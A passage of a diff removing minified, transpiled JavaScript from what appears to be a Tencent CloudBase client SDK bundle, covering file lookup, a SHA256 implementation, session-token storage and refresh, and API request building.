-                    case 31:
-                      if (!e.sent.success) {
-                        e.next = 33;
-                        break;
-                      }
-                      return e.abrupt("return", {
-                        success: !0,
-                        filePath: n,
-                        fileID: h
-                      });
-                    case 33:
-                      throw new ge({
-                        code: "UPLOAD_FAILED",
-                        message: "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                      });
-                    case 34:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "getTempFileURL",
-            value: function () {
-              var e = this,
-                t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                n = t.fileList;
-              return new Promise(function (t, r) {
-                Array.isArray(n) && 0 !== n.length || r(new ge({
-                  code: "INVALID_PARAM",
-                  message: "fileList\u7684\u5143\u7D20\u5FC5\u987B\u662F\u975E\u7A7A\u7684\u5B57\u7B26\u4E32"
-                })), e.getFileInfo({
-                  fileList: n
-                }).then(function (e) {
-                  t({
-                    fileList: n.map(function (t, n) {
-                      var r = e.fileList[n];
-                      return {
-                        fileID: t,
-                        tempFileURL: r && r.url || t
-                      };
-                    })
-                  });
-                });
-              });
-            }
-          }, {
-            key: "getFileInfo",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t,
-                  n,
-                  r,
-                  i = arguments;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (t = i.length > 0 && void 0 !== i[0] ? i[0] : {}, n = t.fileList, Array.isArray(n) && 0 !== n.length) {
-                        e.next = 3;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "fileList\u7684\u5143\u7D20\u5FC5\u987B\u662F\u975E\u7A7A\u7684\u5B57\u7B26\u4E32"
-                      });
-                    case 3:
-                      return r = {
-                        method: "serverless.file.resource.info",
-                        params: JSON.stringify({
-                          id: n.map(function (e) {
-                            return e.split("?")[0];
-                          }).join(",")
-                        })
-                      }, e.next = 6, this.request(this.setupRequest(r));
-                    case 6:
-                      return e.t0 = e.sent.result, e.abrupt("return", {
-                        fileList: e.t0
-                      });
-                    case 8:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }]), e;
-        }(),
-        Pe = {
-          init: function (e) {
-            var t = new Te(e),
-              n = {
-                signInAnonymously: function () {
-                  return t.authorize();
-                },
-                getLoginState: function () {
-                  return Promise.resolve(!1);
-                }
-              };
-            return t.auth = function () {
-              return n;
-            }, t.customAuth = t.auth, t;
-          }
-        },
-        Ae = "undefined" != typeof location && "http:" === location.protocol ? "http:" : "https:";
-      !function (e) {
-        e.local = "local", e.none = "none", e.session = "session";
-      }(Se || (Se = {}));
-      var Ie,
-        Ce = function () {},
-        Ee = S(function (e, t) {
-          var n;
-          e.exports = (n = T, function (e) {
-            var t = n,
-              r = t.lib,
-              i = r.WordArray,
-              o = r.Hasher,
-              a = t.algo,
-              s = [],
-              u = [];
-            !function () {
-              function t(t) {
-                for (var n = e.sqrt(t), r = 2; r <= n; r++) if (!(t % r)) return !1;
-                return !0;
-              }
-              function n(e) {
-                return 4294967296 * (e - (0 | e)) | 0;
-              }
-              for (var r = 2, i = 0; i < 64;) t(r) && (i < 8 && (s[i] = n(e.pow(r, 0.5))), u[i] = n(e.pow(r, 0.3333333333333333)), i++), r++;
-            }();
-            var c = [],
-              l = a.SHA256 = o.extend({
-                _doReset: function () {
-                  this._hash = new i.init(s.slice(0));
-                },
-                _doProcessBlock: function (e, t) {
-                  for (var n = this._hash.words, r = n[0], i = n[1], o = n[2], a = n[3], s = n[4], l = n[5], f = n[6], d = n[7], h = 0; h < 64; h++) {
-                    if (h < 16) c[h] = 0 | e[t + h];else {
-                      var p = c[h - 15],
-                        g = (p << 25 | p >>> 7) ^ (p << 14 | p >>> 18) ^ p >>> 3,
-                        v = c[h - 2],
-                        m = (v << 15 | v >>> 17) ^ (v << 13 | v >>> 19) ^ v >>> 10;
-                      c[h] = g + c[h - 7] + m + c[h - 16];
-                    }
-                    var _ = r & i ^ r & o ^ i & o,
-                      y = (r << 30 | r >>> 2) ^ (r << 19 | r >>> 13) ^ (r << 10 | r >>> 22),
-                      w = d + ((s << 26 | s >>> 6) ^ (s << 21 | s >>> 11) ^ (s << 7 | s >>> 25)) + (s & l ^ ~s & f) + u[h] + c[h];
-                    d = f, f = l, l = s, s = a + w | 0, a = o, o = i, i = r, r = w + (y + _) | 0;
-                  }
-                  n[0] = n[0] + r | 0, n[1] = n[1] + i | 0, n[2] = n[2] + o | 0, n[3] = n[3] + a | 0, n[4] = n[4] + s | 0, n[5] = n[5] + l | 0, n[6] = n[6] + f | 0, n[7] = n[7] + d | 0;
-                },
-                _doFinalize: function () {
-                  var t = this._data,
-                    n = t.words,
-                    r = 8 * this._nDataBytes,
-                    i = 8 * t.sigBytes;
-                  return n[i >>> 5] |= 128 << 24 - i % 32, n[14 + (i + 64 >>> 9 << 4)] = e.floor(r / 4294967296), n[15 + (i + 64 >>> 9 << 4)] = r, t.sigBytes = 4 * n.length, this._process(), this._hash;
-                },
-                clone: function () {
-                  var e = o.clone.call(this);
-                  return e._hash = this._hash.clone(), e;
-                }
-              });
-            t.SHA256 = o._createHelper(l), t.HmacSHA256 = o._createHmacHelper(l);
-          }(Math), n.SHA256);
-        }),
-        Le = Ee,
-        Me = S(function (e, t) {
-          e.exports = T.HmacSHA256;
-        }),
-        De = function () {
-          var e;
-          if (!Promise) {
-            e = function () {}, e.promise = {};
-            var t = function () {
-              throw new ge({
-                message: "Your Node runtime does support ES6 Promises. Set \"global.Promise\" to your preferred implementation of promises."
-              });
-            };
-            return Object.defineProperty(e.promise, "then", {
-              get: t
-            }), Object.defineProperty(e.promise, "catch", {
-              get: t
-            }), e;
-          }
-          var n = new Promise(function (t, n) {
-            e = function (e, r) {
-              return e ? n(e) : t(r);
-            };
-          });
-          return e.promise = n, e;
-        };
-      function je(e) {
-        return void 0 === e;
-      }
-      function Ne(e) {
-        return "[object Null]" === Object.prototype.toString.call(e);
-      }
-      function Re() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
-        return e.replace(/([\s\S]+)\s+(\u8bf7\u524d\u5f80\u4e91\u5f00\u53d1AI\u5c0f\u52a9\u624b\u67e5\u770b\u95ee\u9898\uff1a.*)/, "$1");
-      }
-      function $e() {
-        for (var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32, t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", n = "", r = 0; r < e; r++) n += t.charAt(Math.floor(62 * Math.random()));
-        return n;
-      }
-      !function (e) {
-        e.WEB = "web", e.WX_MP = "wx_mp";
-      }(Ie || (Ie = {}));
-      var Fe = {
-          adapter: null,
-          runtime: void 0
-        },
-        Ue = ["anonymousUuidKey"],
-        Be = function (e) {
-          (0, d.default)(n, e);
-          var t = k(n);
-          function n() {
-            var e;
-            return (0, v.default)(this, n), e = t.call(this), Fe.adapter.root.tcbObject || (Fe.adapter.root.tcbObject = {}), e;
-          }
-          return (0, m.default)(n, [{
-            key: "setItem",
-            value: function (e, t) {
-              Fe.adapter.root.tcbObject[e] = t;
-            }
-          }, {
-            key: "getItem",
-            value: function (e) {
-              return Fe.adapter.root.tcbObject[e];
-            }
-          }, {
-            key: "removeItem",
-            value: function (e) {
-              delete Fe.adapter.root.tcbObject[e];
-            }
-          }, {
-            key: "clear",
-            value: function () {
-              delete Fe.adapter.root.tcbObject;
-            }
-          }]), n;
-        }(Ce);
-      function qe(e, t) {
-        switch (e) {
-          case "local":
-            return t.localStorage || new Be();
-          case "none":
-            return new Be();
-          default:
-            return t.sessionStorage || new Be();
-        }
-      }
-      var ze = function () {
-          function e(t) {
-            if ((0, v.default)(this, e), !this._storage) {
-              this._persistence = Fe.adapter.primaryStorage || t.persistence, this._storage = qe(this._persistence, Fe.adapter);
-              var n = "access_token_".concat(t.env),
-                r = "access_token_expire_".concat(t.env),
-                i = "refresh_token_".concat(t.env),
-                o = "anonymous_uuid_".concat(t.env),
-                a = "login_type_".concat(t.env),
-                s = "token_type_".concat(t.env),
-                u = "user_info_".concat(t.env);
-              this.keys = {
-                accessTokenKey: n,
-                accessTokenExpireKey: r,
-                refreshTokenKey: i,
-                anonymousUuidKey: o,
-                loginTypeKey: a,
-                userInfoKey: u,
-                deviceIdKey: "device_id",
-                tokenTypeKey: s
-              };
-            }
-          }
-          return (0, m.default)(e, [{
-            key: "updatePersistence",
-            value: function (e) {
-              if (e !== this._persistence) {
-                var t = "local" === this._persistence;
-                this._persistence = e;
-                var n = qe(e, Fe.adapter);
-                for (var r in this.keys) {
-                  var i = this.keys[r];
-                  if (!t || !Ue.includes(r)) {
-                    var o = this._storage.getItem(i);
-                    je(o) || Ne(o) || (n.setItem(i, o), this._storage.removeItem(i));
-                  }
-                }
-                this._storage = n;
-              }
-            }
-          }, {
-            key: "setStore",
-            value: function (e, t, n) {
-              if (this._storage) {
-                var r = {
-                    version: n || "localCachev1",
-                    content: t
-                  },
-                  i = JSON.stringify(r);
-                try {
-                  this._storage.setItem(e, i);
-                } catch (e) {
-                  throw e;
-                }
-              }
-            }
-          }, {
-            key: "getStore",
-            value: function (e, t) {
-              try {
-                if (!this._storage) return;
-              } catch (e) {
-                return "";
-              }
-              t = t || "localCachev1";
-              var n = this._storage.getItem(e);
-              return n && n.indexOf(t) >= 0 ? JSON.parse(n).content : "";
-            }
-          }, {
-            key: "removeStore",
-            value: function (e) {
-              this._storage.removeItem(e);
-            }
-          }]), e;
-        }(),
-        He = {},
-        Ye = {};
-      function Je(e) {
-        return He[e];
-      }
-      var Ve = (0, m.default)(function e(t, n) {
-          (0, v.default)(this, e), this.data = n || null, this.name = t;
-        }),
-        Ze = function (e) {
-          (0, d.default)(n, e);
-          var t = k(n);
-          function n(e, r) {
-            var i;
-            return (0, v.default)(this, n), i = t.call(this, "error", {
-              error: e,
-              data: r
-            }), i.error = e, i;
-          }
-          return (0, m.default)(n);
-        }(Ve),
-        We = new (function () {
-          function e() {
-            (0, v.default)(this, e), this._listeners = {};
-          }
-          return (0, m.default)(e, [{
-            key: "on",
-            value: function (e, t) {
-              return function (e, t, n) {
-                n[e] = n[e] || [], n[e].push(t);
-              }(e, t, this._listeners), this;
-            }
-          }, {
-            key: "off",
-            value: function (e, t) {
-              return function (e, t, n) {
-                if (n && n[e]) {
-                  var r = n[e].indexOf(t);
-                  -1 !== r && n[e].splice(r, 1);
-                }
-              }(e, t, this._listeners), this;
-            }
-          }, {
-            key: "fire",
-            value: function (e, t) {
-              if (e instanceof Ze) return console.error(e.error), this;
-              var n = "string" == typeof e ? new Ve(e, t || {}) : e,
-                r = n.name;
-              if (this._listens(r)) {
-                n.target = this;
-                var i,
-                  o = this._listeners[r] ? (0, c.default)(this._listeners[r]) : [],
-                  a = y(o);
-                try {
-                  for (a.s(); !(i = a.n()).done;) {
-                    var s = i.value;
-                    s.call(this, n);
-                  }
-                } catch (u) {
-                  a.e(u);
-                } finally {
-                  a.f();
-                }
-              }
-              return this;
-            }
-          }, {
-            key: "_listens",
-            value: function (e) {
-              return this._listeners[e] && this._listeners[e].length > 0;
-            }
-          }]), e;
-        }())();
-      function Ke(e, t) {
-        We.on(e, t);
-      }
-      function Ge(e) {
-        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
-        We.fire(e, t);
-      }
-      function Qe(e, t) {
-        We.off(e, t);
-      }
-      var Xe,
-        et = "loginStateChanged",
-        tt = "loginStateExpire",
-        nt = "loginTypeChanged",
-        rt = "anonymousConverted",
-        it = "refreshAccessToken";
-      !function (e) {
-        e.ANONYMOUS = "ANONYMOUS", e.WECHAT = "WECHAT", e.WECHAT_PUBLIC = "WECHAT-PUBLIC", e.WECHAT_OPEN = "WECHAT-OPEN", e.CUSTOM = "CUSTOM", e.EMAIL = "EMAIL", e.USERNAME = "USERNAME", e.NULL = "NULL";
-      }(Xe || (Xe = {}));
-      var ot = function () {
-          function e() {
-            (0, v.default)(this, e), this._fnPromiseMap = new Map();
-          }
-          return (0, m.default)(e, [{
-            key: "run",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                var r,
-                  i = this;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return r = this._fnPromiseMap.get(t), e.abrupt("return", (r || (r = new Promise(function () {
-                        var e = (0, l.default)(o.default.mark(function e(r, a) {
-                          var s;
-                          return o.default.wrap(function (e) {
-                            while (1) switch (e.prev = e.next) {
-                              case 0:
-                                return e.prev = 0, e.next = 3, i._runIdlePromise();
-                              case 3:
-                                return s = n(), e.t0 = r, e.next = 7, s;
-                              case 7:
-                                e.t1 = e.sent, (0, e.t0)(e.t1), e.next = 14;
-                                break;
-                              case 11:
-                                e.prev = 11, e.t2 = e["catch"](0), a(e.t2);
-                              case 14:
-                                return e.prev = 14, i._fnPromiseMap.delete(t), e.finish(14);
-                              case 17:
-                              case "end":
-                                return e.stop();
-                            }
-                          }, e, null, [[0, 11, 14, 17]]);
-                        }));
-                        return function (t, n) {
-                          return e.apply(this, arguments);
-                        };
-                      }()), this._fnPromiseMap.set(t, r)), r));
-                    case 2:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "_runIdlePromise",
-            value: function () {
-              return Promise.resolve();
-            }
-          }]), e;
-        }(),
-        at = function () {
-          function e(t) {
-            (0, v.default)(this, e), this._singlePromise = new ot(), this._cache = Je(t.env), this._baseURL = "https://".concat(t.env, ".ap-shanghai.tcb-api.tencentcloudapi.com"), this._reqClass = new Fe.adapter.reqClass({
-              timeout: t.timeout,
-              timeoutMsg: "\u8BF7\u6C42\u5728".concat(t.timeout / 1000, "s\u5185\u672A\u5B8C\u6210\uFF0C\u5DF2\u4E2D\u65AD"),
-              restrictedMethods: ["post"]
-            });
-          }
-          return (0, m.default)(e, [{
-            key: "_getDeviceId",
-            value: function () {
-              if (this._deviceID) return this._deviceID;
-              var e = this._cache.keys.deviceIdKey,
-                t = this._cache.getStore(e);
-              return "string" == typeof t && t.length >= 16 && t.length <= 48 || (t = $e(), this._cache.setStore(e, t)), this._deviceID = t, t;
-            }
-          }, {
-            key: "_request",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                var r,
-                  i,
-                  a,
-                  s,
-                  u,
-                  c = arguments;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (r = c.length > 2 && void 0 !== c[2] ? c[2] : {}, i = {
-                        "x-request-id": $e(),
-                        "x-device-id": this._getDeviceId()
-                      }, !r.withAccessToken) {
-                        e.next = 9;
-                        break;
-                      }
-                      return a = this._cache.keys.tokenTypeKey, e.next = 6, this.getAccessToken();
-                    case 6:
-                      s = e.sent, u = this._cache.getStore(a), i.authorization = "".concat(u, " ").concat(s);
-                    case 9:
-                      return e.abrupt("return", this._reqClass["get" === r.method ? "get" : "post"]({
-                        url: "".concat(this._baseURL).concat(t),
-                        data: n,
-                        headers: i
-                      }));
-                    case 10:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "_fetchAccessToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t,
-                  n,
-                  r,
-                  i,
-                  a,
-                  s,
-                  u,
-                  c,
-                  f,
-                  d,
-                  h = this;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (t = this._cache.keys, n = t.loginTypeKey, r = t.accessTokenKey, i = t.accessTokenExpireKey, a = t.tokenTypeKey, s = this._cache.getStore(n), !s || s === Xe.ANONYMOUS) {
-                        e.next = 3;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_OPERATION",
-                        message: "\u975E\u533F\u540D\u767B\u5F55\u4E0D\u652F\u6301\u5237\u65B0 access token"
-                      });
-                    case 3:
-                      return e.next = 5, this._singlePromise.run("fetchAccessToken", (0, l.default)(o.default.mark(function e() {
-                        return o.default.wrap(function (e) {
-                          while (1) switch (e.prev = e.next) {
-                            case 0:
-                              return e.next = 2, h._request("/auth/v1/signin/anonymously", {}, {
-                                method: "post"
-                              });
-                            case 2:
-                              return e.abrupt("return", e.sent.data);
-                            case 3:
-                            case "end":
-                              return e.stop();
-                          }
-                        }, e);
-                      })));
-                    case 5:
-                      return u = e.sent, c = u.access_token, f = u.expires_in, d = u.token_type, e.abrupt("return", (this._cache.setStore(a, d), this._cache.setStore(r, c), this._cache.setStore(i, Date.now() + 1000 * f), c));
-                    case 10:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "isAccessTokenExpired",
-            value: function (e, t) {
-              var n = !0;
-              return e && t && (n = t < Date.now()), n;
-            }
-          }, {
-            key: "getAccessToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n, r, i, a;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return t = this._cache.keys, n = t.accessTokenKey, r = t.accessTokenExpireKey, i = this._cache.getStore(n), a = this._cache.getStore(r), e.abrupt("return", this.isAccessTokenExpired(i, a) ? this._fetchAccessToken() : i);
-                    case 2:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "refreshAccessToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n, r, i;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return t = this._cache.keys, n = t.accessTokenKey, r = t.accessTokenExpireKey, i = t.loginTypeKey, e.abrupt("return", (this._cache.removeStore(n), this._cache.removeStore(r), this._cache.setStore(i, Xe.ANONYMOUS), this.getAccessToken()));
-                    case 2:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "getUserInfo",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t = this;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", this._singlePromise.run("getUserInfo", (0, l.default)(o.default.mark(function e() {
-                        return o.default.wrap(function (e) {
-                          while (1) switch (e.prev = e.next) {
-                            case 0:
-                              return e.next = 2, t._request("/auth/v1/user/me", {}, {
-                                withAccessToken: !0,
-                                method: "get"
-                              });
-                            case 2:
-                              return e.abrupt("return", e.sent.data);
-                            case 3:
-                            case "end":
-                              return e.stop();
-                          }
-                        }, e);
-                      }))));
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }]), e;
-        }(),
-        st = ["auth.getJwt", "auth.logout", "auth.signInWithTicket", "auth.signInAnonymously", "auth.signIn", "auth.fetchAccessTokenWithRefreshToken", "auth.signUpWithEmailAndPassword", "auth.activateEndUserMail", "auth.sendPasswordResetEmail", "auth.resetPasswordWithToken", "auth.isUsernameRegistered"],
-        ut = {
-          "X-SDK-Version": "1.3.5"
-        };
-      function ct(e, t, n) {
-        var r = e[t];
-        e[t] = function (t) {
-          var i = {},
-            o = {};
-          n.forEach(function (n) {
-            var r = n.call(e, t),
-              a = r.data,
-              s = r.headers;
-            Object.assign(i, a), Object.assign(o, s);
-          });
-          var a = t.data;
-          return a && function () {
-            var e;
-            if (e = a, "[object FormData]" !== Object.prototype.toString.call(e)) t.data = x(x({}, a), i);else for (var n in i) a.append(n, i[n]);
-          }(), t.headers = x(x({}, t.headers || {}), o), r.call(e, t);
-        };
-      }
-      function lt() {
-        var e = Math.random().toString(16).slice(2);
-        return {
-          data: {
-            seqId: e
-          },
-          headers: x(x({}, ut), {}, {
-            "x-seqid": e
-          })
-        };
-      }
-      var ft = function () {
-          function e() {
-            var t,
-              n = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
-            (0, v.default)(this, e), this.config = n, this._reqClass = new Fe.adapter.reqClass({
-              timeout: this.config.timeout,
-              timeoutMsg: "\u8BF7\u6C42\u5728".concat(this.config.timeout / 1000, "s\u5185\u672A\u5B8C\u6210\uFF0C\u5DF2\u4E2D\u65AD"),
-              restrictedMethods: ["post"]
-            }), this._cache = Je(this.config.env), this._localCache = (t = this.config.env, Ye[t]), this.oauth = new at(this.config), ct(this._reqClass, "post", [lt]), ct(this._reqClass, "upload", [lt]), ct(this._reqClass, "download", [lt]);
-          }
-          return (0, m.default)(e, [{
-            key: "post",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this._reqClass.post(t);
-                    case 2:
-                      return e.abrupt("return", e.sent);
-                    case 3:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "upload",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this._reqClass.upload(t);
-                    case 2:
-                      return e.abrupt("return", e.sent);
-                    case 3:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "download",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this._reqClass.download(t);
-                    case 2:
-                      return e.abrupt("return", e.sent);
-                    case 3:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "refreshAccessToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return this._refreshAccessTokenPromise || (this._refreshAccessTokenPromise = this._refreshAccessToken()), e.prev = 1, e.next = 4, this._refreshAccessTokenPromise;
-                    case 4:
-                      t = e.sent, e.next = 10;
-                      break;
-                    case 7:
-                      e.prev = 7, e.t0 = e["catch"](1), n = e.t0;
-                    case 10:
-                      if (this._refreshAccessTokenPromise = null, this._shouldRefreshAccessTokenHook = null, !n) {
-                        e.next = 12;
-                        break;
-                      }
-                      throw n;
-                    case 12:
-                      return e.abrupt("return", t);
-                    case 13:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this, [[1, 7]]);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "_refreshAccessToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n, r, i, a, s, u, c, l, f, d, h, p;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (t = this._cache.keys, n = t.accessTokenKey, r = t.accessTokenExpireKey, i = t.refreshTokenKey, a = t.loginTypeKey, s = t.anonymousUuidKey, this._cache.removeStore(n), this._cache.removeStore(r), u = this._cache.getStore(i), u) {
-                        e.next = 5;
-                        break;
-                      }
-                      throw new ge({
-                        message: "\u672A\u767B\u5F55CloudBase"
-                      });
-                    case 5:
-                      return c = {
-                        refresh_token: u
-                      }, e.next = 8, this.request("auth.fetchAccessTokenWithRefreshToken", c);
-                    case 8:
-                      if (l = e.sent, !l.data.code) {
-                        e.next = 21;
-                        break;
-                      }
-                      if (f = l.data.code, "SIGN_PARAM_INVALID" !== f && "REFRESH_TOKEN_EXPIRED" !== f && "INVALID_REFRESH_TOKEN" !== f) {
-                        e.next = 20;
-                        break;
-                      }
-                      if (this._cache.getStore(a) !== Xe.ANONYMOUS || "INVALID_REFRESH_TOKEN" !== f) {
-                        e.next = 19;
-                        break;
-                      }
-                      return d = this._cache.getStore(s), h = this._cache.getStore(i), e.next = 17, this.send("auth.signInAnonymously", {
-                        anonymous_uuid: d,
-                        refresh_token: h
-                      });
-                    case 17:
-                      return p = e.sent, e.abrupt("return", (this.setRefreshToken(p.refresh_token), this._refreshAccessToken()));
-                    case 19:
-                      Ge(tt), this._cache.removeStore(i);
-                    case 20:
-                      throw new ge({
-                        code: l.data.code,
-                        message: "\u5237\u65B0access token\u5931\u8D25\uFF1A".concat(l.data.code)
-                      });
-                    case 21:
-                      if (!l.data.access_token) {
-                        e.next = 23;
-                        break;
-                      }
-                      return e.abrupt("return", (Ge(it), this._cache.setStore(n, l.data.access_token), this._cache.setStore(r, l.data.access_token_expire + Date.now()), {
-                        accessToken: l.data.access_token,
-                        accessTokenExpire: l.data.access_token_expire
-                      }));
-                    case 23:
-                      l.data.refresh_token && (this._cache.removeStore(i), this._cache.setStore(i, l.data.refresh_token), this._refreshAccessToken());
-                    case 24:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "getAccessToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n, r, i, a, s, u;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (t = this._cache.keys, n = t.accessTokenKey, r = t.accessTokenExpireKey, i = t.refreshTokenKey, this._cache.getStore(i)) {
-                        e.next = 3;
-                        break;
-                      }
-                      throw new ge({
-                        message: "refresh token\u4E0D\u5B58\u5728\uFF0C\u767B\u5F55\u72B6\u6001\u5F02\u5E38"
-                      });
-                    case 3:
-                      if (a = this._cache.getStore(n), s = this._cache.getStore(r), u = !0, e.t0 = this._shouldRefreshAccessTokenHook, !e.t0) {
-                        e.next = 9;
-                        break;
-                      }
-                      return e.next = 8, this._shouldRefreshAccessTokenHook(a, s);
-                    case 8:
-                      e.t0 = !e.sent;
-                    case 9:
-                      if (e.t1 = e.t0, !e.t1) {
-                        e.next = 12;
-                        break;
-                      }
-                      u = !1;
-                    case 12:
-                      return e.abrupt("return", (!a || !s || s < Date.now()) && u ? this.refreshAccessToken() : {
-                        accessToken: a,
-                        accessTokenExpire: s
-                      });
-                    case 13:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "request",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n, r) {
-                var i, a, s, u, c, l, f, d, h, p, g, v, m, _, y;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (i = "x-tcb-trace_".concat(this.config.env), a = "application/x-www-form-urlencoded", s = x({
-                        action: t,
-                        env: this.config.env,
-                        dataVersion: "2019-08-16"
-                      }, n), e.t0 = -1 === st.indexOf(t), !e.t0) {
-                        e.next = 9;
-                        break;
-                      }
-                      return this._cache.keys, e.next = 8, this.oauth.getAccessToken();
-                    case 8:
-                      s.access_token = e.sent;
-                    case 9:
-                      if ("storage.uploadFile" !== t) {
-                        e.next = 15;
-                        break;
-                      }
-                      for (c in u = new FormData(), u) u.hasOwnProperty(c) && void 0 !== u[c] && u.append(c, s[c]);
-                      a = "multipart/form-data", e.next = 17;
-                      break;
-                    case 15:
-                      for (l in a = "application/json", u = {}, s) void 0 !== s[l] && (u[l] = s[l]);
-                    case 17:
-                      return f = {
-                        headers: {
-                          "content-type": a
-                        }
-                      }, r && r.timeout && (f.timeout = r.timeout), r && r.onUploadProgress && (f.onUploadProgress = r.onUploadProgress), d = this._localCache.getStore(i), d && (f.headers["X-TCB-Trace"] = d), h = n.parse, p = n.inQuery, g = n.search, v = {
-                        env: this.config.env
-                      }, h && (v.parse = !0), p && (v = x(x({}, p), v)), m = function (e, t) {
-                        var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
-                          r = /\?/.test(t),
-                          i = "";
-                        for (var o in n) "" === i ? !r && (t += "?") : i += "&", i += "".concat(o, "=").concat(encodeURIComponent(n[o]));
-                        return /^http(s)?\:\/\//.test(t += i) ? t : "".concat(e).concat(t);
-                      }(Ae, "//tcb-api.tencentcloudapi.com/web", v), g && (m += g), e.next = 28, this.post(x({
-                        url: m,
-                        data: u
-                      }, f));
-                    case 28:
-                      if (_ = e.sent, y = _.header && _.header["x-tcb-trace"], y && this._localCache.setStore(i, y), (200 === Number(_.status) || 200 === Number(_.statusCode)) && _.data) {
-                        e.next = 32;
-                        break;
-                      }
-                      throw new ge({
-                        code: "NETWORK_ERROR",
-                        message: "network request error"
-                      });
-                    case 32:
-                      return e.abrupt("return", _);
-                    case 33:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n, r) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "send",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n,
-                  r,
-                  i,
-                  a,
-                  s = arguments;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return n = s.length > 1 && void 0 !== s[1] ? s[1] : {}, r = s.length > 2 && void 0 !== s[2] ? s[2] : {}, e.next = 4, this.request(t, n, x(x({}, r), {}, {
-                        onUploadProgress: n.onUploadProgress
-                      }));
